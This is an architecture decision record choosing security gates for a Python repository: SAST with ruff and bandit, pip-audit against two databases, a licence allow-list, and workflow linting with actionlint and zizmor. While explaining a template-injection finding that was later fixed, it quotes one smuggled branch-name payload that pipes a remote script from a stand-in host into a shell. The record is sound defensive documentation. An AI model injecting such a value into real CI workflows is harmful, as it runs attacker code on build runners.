# ADR-0018: Security tooling — SAST, SCA, licences, and workflow linting

- **Status:** Accepted
- **Date:** 2026-09-17
- **Phase:** 1.5 (Hardening)
- **Related:** [ADR-0013](0013-verification-breadth.md), [`../risks/ACCEPTED_RISKS.md`](../risks/ACCEPTED_RISKS.md)

## Context

Phase 1.5 adds four security gates: SAST, dependency audit (SCA), licence
checking, and workflow linting. This ADR records what was chosen, what was
rejected, and — most importantly — the measurements that determined tool
selection rather than preference.

The repository has **zero runtime dependencies** and is Apache-2.0. That shapes
each decision below.

## Decision 1: SAST runs both ruff `S` and bandit

**Not one or the other.** ruff's `S` rules are frequently described as a
bandit replacement. They are not:

- `B614` (`pytorch_load`) and `B615` (`huggingface_unsafe_download`) are **not
  ported**;
- `S320` was **removed** from ruff;
- `S401`–`S403` are **preview-only**, so they silently never fire under a
  normal configuration;
- bandit's ~32 plugin modules cover Django XSS/SQLi, wildcard injection and
  weak crypto with no ruff equivalent.

ruff's maintainers describe the gap as deliberate (`astral-sh/ruff#20129`).
Two tools with overlapping-but-different rule sets is redundancy, not waste.

**Measured noise reduction.** Raw bandit on this repository:

| Finding | Count | Nature |
|---|---|---|
| `B101` (assert) | 550 | Every `assert` in the test suite |
| `B108` (hardcoded tmp) | 4 | Forged traversal payloads (`/tmp/attacker`) in injection tests |
| `B105` (hardcoded password) | 2 | `sk-LEAKED-SECRET`, `hunter2` — **asserted to be redacted** |
| `B404`/`B603` (subprocess) | 2 | Fixed-argv calls |
| **Total** | **558** | |

A scanner reporting 558 findings is a scanner nobody reads. Two mitigations:

1. `skips = ["B101"]` repository-wide. Verified effective: 558 → 8.
2. Bandit is **scoped by path** to production code at `-ll`
   (MEDIUM+ severity): `catalog`, `integrations`, `scripts`, excluding
   `tests/` and `examples/`. Result: **0 findings**, exit 0.

The path scoping is what removes the remaining false positives, because the 8
are all forged attack payloads and fake credentials inside tests that *assert
those inputs are rejected*. A scanner cannot distinguish a forged secret from a
real one. Both decisions are recorded as **AR-001** and **AR-002** rather than
silently applied.

**Known limitation, documented rather than worked around:** bandit's per-plugin
`skips` take glob patterns but do not reliably suppress `B101` for nested test
directories. The blanket skip is used because it measurably works; a rule that
quietly does not do what it says is worse than one that plainly does not run.

**One gate-breaking mistake worth recording.** The target first ran
`ruff check --select S`. Passing `--select` on the command line **overrides**
`per-file-ignores` in `pyproject.toml`, so `S101` fired on every `assert` in
the suite (`integrations/agent_loop_end_to_end/tests/test_end_to_end.py:467`).
The correct invocation is `ruff check .` — the configured selection already
includes `S`. Caught by running it, not by reasoning.

## Decision 2: SCA runs pip-audit twice, against two data sources

```
pip-audit -s pypi
pip-audit -s osv
```

**The ESEM'21 study of nine SCA tools** found reported vulnerability counts
ranging **17 to 332 on identical projects**, concluding practitioners "should
not rely on any single tool". OSV and PyPI/NVD each carry advisories the other
lacks. A second lineage costs one step and closes a real recall gap.

Also relevant to why the gate is written as two explicit invocations rather
than one retry loop: **pip-audit exits 1 identically** for a real advisory, a
service error, and a crash. The exit code alone cannot distinguish "vulnerable"
from "the network failed", so the gate must not pretend it can.

## Decision 3: Licences use an allow-list, and UNKNOWN fails

`scripts/check_licenses.py` checks **installed distributions** against an
allow-list, and treats an unresolvable licence as a **failure, not a warning**.

- A **deny-list** can only reject what somebody remembered to enumerate; a
  licence nobody thought of passes silently. GitHub deprecated
  `deny-licenses` in `dependency-review-action` for exactly this reason
  (issue #938), and Anchore's policy engine is built on "deny all except".
- The **UNKNOWN case is decisive**: GitHub's own documentation states that when
  a licence cannot be detected "the action won't fail". "We could not tell" and
  "we checked and it is fine" must never be indistinguishable.

**What it cannot do, stated plainly:** every metadata-based tool reads the
*declared* licence. A package declaring MIT while vendoring GPL reads as MIT.
That needs file-level scanning (`scancode-toolkit`), which is deferred as
**DW-011**. This gate guards against **accidental** drift, not as a legal audit.

**A real finding during implementation.** Three packages — `Jinja2`,
`colorama`, `prompt_toolkit` — declare no licence field at all, only the Trove
classifier `License :: OSI Approved :: BSD License`, which names **no clause
count**. Guessing 2- vs 3-clause would be guessing in the permissive direction,
which is precisely the failure an allow-list exists to prevent. Instead the
check reads the **licence text the package ships**: the BSD template containing
"neither the name" is 3-clause. Evidence, not assumption. All 63 packages pass.

## Decision 4: Workflow linting runs actionlint AND zizmor

Complementary, not alternatives:

- **actionlint** — workflow *correctness*: expression type errors, invalid
  inputs, shellcheck on `run:` blocks. Maintained; distributed as a release
  asset so it can be version-pinned.
- **zizmor** — workflow *security*: template injection, credential persistence,
  unpinned `uses:`, dangerous triggers. Also acts as a GitHub Actions
  harden-runner adjunct.

**This decision paid for itself immediately, on first execution.** The two
tools were initially reported as `SKIPPED (CI always runs it)` because neither
was installed locally, so `make workflows` had never actually run its audits.
Installing them caused zizmor to fail the gate with two findings in the
`ci.yml` written during this same phase:

- `template-injection` at **HIGH confidence** — `git fetch origin "${{
  github.base_ref }}"` expanded an attacker-controlled branch name into a
  `run:` block. `${{ }}` expansion happens *before* the shell parses the
  script, so a branch named `x"; curl evil.sh | sh; "` executes. Fixed by
  passing the value through `env:` and referencing `"$BASE_REF"`, which the
  shell treats as data rather than code. The same fix was applied to the
  `contains(...)` label expression on the next line.
- `artipacked` at Low confidence — `actions/checkout` left the `GITHUB_TOKEN`
  persisted in `.git/config`. Fixed with `persist-credentials: false`; nothing
  in the workflow pushes, so the credential was never needed.

**actionlint alone would have caught neither.** It validates expression types
and shell syntax, and both of these are syntactically valid. That is the
concrete argument for running both tools rather than picking one: they fail on
disjoint inputs.

The deeper lesson is about *skips*. A gate that reports `SKIPPED` is not a
passing gate, and this one had silently never run — the vulnerability existed
for the entire period the gate claimed to check for it. `make workflows`
therefore distinguishes the two loudly, and the CI job installs both tools from
pinned release assets so the real audits always execute there.

## Decision 5: Tool versions are pinned INSIDE the workflow

This is the specific lesson of **CVE-2026-33634** (March 2026), in which
LiteLLM was backdoored **through its own security scan**. Its
`security_scans.sh` installed Trivy from a package repository, which "always
pulled the latest version available" with "no pinning or checksum
verification". The malicious binary exfiltrated CI credentials, which were then
used to publish backdoored package releases.

**SHA-pinning `uses:` references would not have prevented it**, because the
compromised component was not an action — it was a tool installed by a shell
command. Both halves are required. `ci.yml` therefore pins `gitleaks` and
`actionlint` to exact versions from the projects' own release assets, and
`zizmor` through the Python dev toolchain.

## Options considered

| Option | Verdict | Why |
|---|---|---|
| ruff `S` only | **Rejected** | Measured rule gaps (B614/B615 unported, S320 removed, S401–403 preview-only). |
| bandit only | **Rejected** | Misses ruff's faster, broader `S` coverage and does not run in the editor. |
| Bandit unscoped, all findings | **Rejected** | 558 findings, all but 8 false positives. Teaches the team to ignore the scanner. |
| `# nosec` on each false positive | **Rejected** | A published practitioner review found `# nosec` had been "suppressing real vulnerabilities, not false positives". Path scoping achieves the same result without per-line suppressions that outlive their justification. |
| pip-audit with one source | **Rejected** | ESEM'21: counts ranged 17–332 on identical projects. |
| `safety` CLI | **Rejected** | Requires an account for the maintained database; pip-audit's OSV and PyPI sources need none. |
| Licence deny-list | **Rejected** | GitHub deprecated the approach; unknown licences pass silently. |
| `licensecheck` | **Rejected** | Narrower ecosystem support than the allow-list script, and no better on ambiguity. |
| Fail on unknown licence (chosen) | **Accepted** | The safe direction. Cost: a new package with sloppy metadata fails the build, which is a five-minute fix and a genuine signal. |
| actionlint only | **Rejected** | No security rules — misses template injection and unpinned uses. |
| zizmor only | **Rejected** | No shellcheck on `run:` blocks and no expression type checking. |
| Trivy for container/IaC scanning | **Rejected** | There are no containers or IaC. It is also the exact package whose unpinned install caused CVE-2026-33634. |
| Dependabot **auto-merge** | **Rejected** | A version is not safe because a bot proposed it. See ADR-0020. |
| Vault/Secrets Manager for CI secrets | **Rejected (deferred)** | No deployment target and no secrets to manage yet. Would be infrastructure without a consumer. |

## Consequences

**Positive.** Four gates with measured, documented behaviour. Every
suppression has a reason and an expiry. The SAST gate went from 558 unreviewable
findings to 0 actionable ones without weakening the check.

**Negative / accepted costs.**

- Four new dev dependencies (`bandit`, `pip-audit`, plus transitive).
- The licence allow-list will require maintenance as the toolchain grows. That
  is the intended friction: adding a dependency is a decision.
- `actionlint` and `zizmor` are not installed locally by default; `make
  workflows` prints `SKIPPED (CI always runs it)` rather than passing silently.
  An unrun check must never look like a passed one (charter §28). Both are
  installed on this machine and the gate runs its real audits; the SKIP path
  remains for a fresh clone.
- Bandit does not scan test files, so a **real** hardcoded credential in a test
  would not be caught by bandit. `gitleaks` scans full history for exactly
  that, on every commit and in CI. Recorded as AR-002.

## Compliance

- [`CHARTER.md`](../../CHARTER.md) §20 — every suppression is recorded with a
  reason in `ACCEPTED_RISKS.md`.
- §22 — dependency review gate; no runtime dependency was added.
- §23 — supply chain. The in-workflow pinning decision comes directly from
  CVE-2026-33634.
- §28 — no check was weakened; the SAST gate was *scoped*, and the scoping is
  documented and reversible.
- Enforced by: `make sast`, `make sca`, `make licenses`, `make secrets`,
  `make workflows`.
